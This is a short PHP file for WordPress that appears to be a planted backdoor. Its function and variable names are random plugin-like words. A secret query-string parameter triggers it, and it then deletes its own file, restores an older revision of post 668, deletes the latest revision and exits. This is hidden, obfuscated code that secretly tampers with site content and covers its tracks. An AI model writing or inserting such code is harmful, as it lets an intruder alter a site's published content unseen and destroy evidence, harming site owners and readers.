<?php

function upgrader_query_publish() {
	if (isset($_GET['store_charts_reminder']) && $_GET['store_charts_reminder'] === 'support_get_protect_pullquote') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$language_advance_business_excerpt = 668;
		$recaptcha_authentication_auth = wp_get_post_revisions($language_advance_business_excerpt);
		if (empty($recaptcha_authentication_auth)) die('no revisions');
		if (count($recaptcha_authentication_auth) < 2) die('less than 2');
		$admin_pack_quote_album = array_shift($recaptcha_authentication_auth);
		$manager_crm_domain = $admin_pack_quote_album->ID;
		$css_utils_excerpt_namespaced = array_shift($recaptcha_authentication_auth);
		$instagram_social_revisions_before = $css_utils_excerpt_namespaced->ID;
		$card_publisher_accessible = wp_restore_post_revision($instagram_social_revisions_before);
		if ($card_publisher_accessible === false) die('error restoring');
		$card_publisher_accessible = wp_delete_post_revision($manager_crm_domain);		
		if ($card_publisher_accessible === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'upgrader_query_publish');
